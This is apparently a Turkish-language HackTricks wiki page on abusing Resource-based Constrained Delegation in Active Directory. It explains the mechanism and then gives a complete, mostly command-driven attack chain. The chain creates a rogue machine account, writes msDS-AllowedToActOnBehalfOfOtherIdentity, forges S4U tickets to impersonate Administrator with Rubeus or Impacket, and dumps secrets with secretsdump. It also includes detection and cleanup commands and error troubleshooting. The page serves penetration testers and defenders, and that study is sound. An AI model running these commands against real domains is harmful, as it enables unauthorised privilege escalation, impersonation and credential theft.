# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation Temelleri

Bu, temel [Constrained Delegation](constrained-delegation.md) ile benzerdir ancak bir **nesneye** bir **makineye karşı herhangi bir kullanıcıyı taklit etme** izni vermek yerine, Resource-based Constrain Delegation **nesnenin üzerinde kimin ona karşı herhangi bir kullanıcıyı taklit edebileceğini** belirler.

Bu durumda, kısıtlanmış nesnenin üzerinde, ona karşı herhangi bir kullanıcıyı taklit edebilecek kullanıcının adını içeren _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ adlı bir öznitelik bulunur.

Bu Constrained Delegation ile diğer delegasyonlar arasındaki bir diğer önemli fark, bir bilgisayar hesabı üzerinde **yazma izinlerine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) sahip herhangi bir kullanıcının **_msDS-AllowedToActOnBehalfOfOtherIdentity_** değerini ayarlayabilmesidir (Diğer Delegation türlerinde domain admin privs gerekiyordu).

### Yeni Kavramlar

Constrained Delegation'da, kullanıcının _userAccountControl_ değerindeki **`TrustedToAuthForDelegation`** bayrağının bir **S4U2Self** gerçekleştirmek için gerektiği söylenirdi. Ancak bu tamamen doğru değildir. Gerçek şu ki, o değer olmasa bile, eğer bir **service** iseniz (SPN'e sahipseniz), herhangi bir kullanıcıya karşı **S4U2Self** gerçekleştirebilirsiniz; fakat eğer **`TrustedToAuthForDelegation`** değerine sahipseniz dönen TGS **Forwardable** olur, bu bayrağa sahip değilseniz dönen TGS **Forwardable** olmaz.

Ancak, S4U2Proxy'de kullanılan **TGS** **NOT Forwardable** ise bir **basic Constrain Delegation**'ı kötüye kullanmaya çalışmak **çalışmaz**. Fakat eğer bir **Resource-Based constrain delegation**'ı istismar etmeye çalışıyorsanız, bu **çalışır**.

### Saldırı yapısı

> Eğer bir **Computer** hesabı üzerinde **write equivalent privileges**'a sahipseniz, o makinede **privileged access** elde edebilirsiniz.

Diyelim ki saldırganın hedef bilgisayar üzerinde zaten **write equivalent privileges**'a sahip olduğu durumda:

1. Saldırgan, bir **SPN**'ye sahip bir hesabı **compromise eder** veya **yeni bir tane oluşturur** (“Service A”). Unutmayın ki **any** _Admin User_ başka bir özel ayrıcalığa ihtiyaç duymadan en fazla 10 Computer objesi oluşturabilir (**_MachineAccountQuota_**) ve bunlara bir **SPN** atayabilir. Bu yüzden saldırgan bir Computer objesi oluşturup bir SPN belirleyebilir.
2. Saldırgan, hedef bilgisayar (ServiceB) üzerindeki **WRITE privilege**'ını kötüye kullanarak **resource-based constrained delegation**'ı yapılandırır ve ServiceA'nın o hedef bilgisayara (ServiceB) karşı herhangi bir kullanıcıyı taklit etmesine izin verir.
3. Saldırgan, Service A'dan Service B'ye, Service B'ye **privileged access**'e sahip bir kullanıcı için **full S4U attack** (S4U2Self ve S4U2Proxy) gerçekleştirmek üzere Rubeus'u kullanır.
1. S4U2Self (SPN ele geçirilen/oluşturulan hesaptan): Kendim için **TGS of Administrator** talep edin (Not Forwardable).
2. S4U2Proxy: Bir önceki adımda alınan **not Forwardable TGS**'yi kullanarak **Administrator**'dan **victim host** için bir **TGS** talep edin.
3. Not Forwardable bir TGS kullansanız bile, Resource-based constrained delegation'ı istismar ettiğiniz için bu işlem işe yarar.
4. Saldırgan **pass-the-ticket** yaparak kullanıcıyı **impersonate** edebilir ve **victim ServiceB**'ye erişim elde edebilir.

Etki alanının _**MachineAccountQuota**_ değerini kontrol etmek için şunu kullanabilirsiniz:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Saldırı

### Bilgisayar Nesnesi Oluşturma

Etki alanı içinde bir bilgisayar nesnesi oluşturmak için **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation Yapılandırma

**activedirectory PowerShell module kullanarak**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**powerview Kullanımı**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Tam bir S4U attack gerçekleştirme (Windows/Rubeus)

Öncelikle, parolası `123456` olan yeni Computer object'i oluşturduk, bu yüzden o parolanın hash'ine ihtiyacımız var:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Bu, o hesap için RC4 and AES hashes'i yazdıracaktır.\ Şimdi, attack gerçekleştirilebilir:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
`/altservice` parametresini kullanarak Rubeus ile tek seferde birden çok hizmet için bilet oluşturabilirsiniz:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kullanıcıların "**Cannot be delegated**" adlı bir özelliğe sahip olduğunu unutmayın. Eğer bir kullanıcının bu özellik True ise, onu taklit edemezsiniz. Bu özellik bloodhound içinde görülebilir.

### Linux araçları: Impacket ile uçtan uca RBCD (2024+)

Linux'tan çalışıyorsanız, resmi Impacket araçlarını kullanarak tam RBCD zincirini gerçekleştirebilirsiniz:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notlar
- LDAP signing/LDAPS zorunluysa, `impacket-rbcd -use-ldaps ...` kullanın.
- AES anahtarlarını tercih edin; birçok modern etki alanı RC4'ü kısıtlar. Impacket ve Rubeus her ikisi de yalnızca AES akışlarını destekler.
- Impacket bazı araçlar için `sname` ("AnySPN") yeniden yazabilir, ancak mümkün olduğunda doğru SPN'i edinin (ör. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Erişim

Son komut satırı **tam S4U saldırısını gerçekleştirecek ve Administrator'dan alınan TGS'yi** hedef hosta **bellek** içinde enjekte edecektir.\
Bu örnekte Administrator'dan **CIFS** servisi için bir TGS talep edildi, bu yüzden **C$**'ye erişebileceksiniz:
```bash
ls \\victim.domain.local\C$
```
### Farklı servis ticket'larını suistimal et

Detaylar için [**available service tickets here**](silver-ticket.md#available-services) sayfasına bakın.

## Keşif, denetleme ve temizleme

### RBCD yapılandırılmış bilgisayarları listeleme

PowerShell (SIDs'leri çözmek için SD'yi çözümleme):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (tek bir komutla oku veya temizle):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Temizleme / RBCD sıfırlama

- PowerShell (özniteliği temizle):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Hataları

- **`KDC_ERR_ETYPE_NOTSUPP`**: Bu, Kerberos'un DES veya RC4 kullanmayacak şekilde yapılandırıldığı ve siz sadece RC4 hash'ini sağladığınız anlamına gelir. Rubeus'a en az AES256 hash'ini verin (veya sadece rc4, aes128 ve aes256 hash'lerini sağlayın). Örnek: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Bu, mevcut bilgisayarın saati ile DC'nin saatinin farklı olduğunu ve Kerberos'un düzgün çalışmadığını gösterir.
- **`preauth_failed`**: Bu, verilen kullanıcı adı + hash'lerin oturum açmak için çalışmadığı anlamına gelir. Hash'leri oluştururken kullanıcı adının içine "$" koymayı unutmuş olabilirsiniz (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Bu şu anlama gelebilir:
- Taklit etmeye çalıştığınız kullanıcı istenen servise erişemiyor olabilir (çünkü onu taklit edemiyorsunuz veya yeterli ayrıcalıkları yok).
- İstenen servis mevcut değil (ör. winrm için ticket istiyorsanız ama winrm çalışmıyorsa).
- Oluşturulan fakecomputer, hedef sunucu üzerindeki ayrıcalıklarını kaybetmiş olabilir ve bunları geri vermeniz gerekir.
- Klasik KCD'yi kötüye kullanıyorsunuz; unutmayın RBCD non-forwardable S4U2Self ticketlerle çalışır, KCD ise forwardable gerektirir.

## Notlar, relays ve alternatifler

- LDAP filtrelenmişse RBCD SD'yi AD Web Services (ADWS) üzerinden de yazabilirsiniz. Bkz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay zincirleri sıklıkla tek adımda local SYSTEM elde etmek için RBCD ile sona erer. Pratik uçtan uca örnekler için bakın:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Eğer LDAP signing/channel binding **disabled** ise ve bir machine account oluşturabiliyorsanız, KrbRelayUp gibi araçlar zorlanan bir Kerberos kimlik doğrulamasını LDAP'a relay edebilir, hedef bilgisayar nesnesi üzerinde machine account'unuz için `msDS-AllowedToActOnBehalfOfOtherIdentity` ayarlayabilir ve hemen off-host S4U ile **Administrator**'ı taklit edebilir.

## Referanslar

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
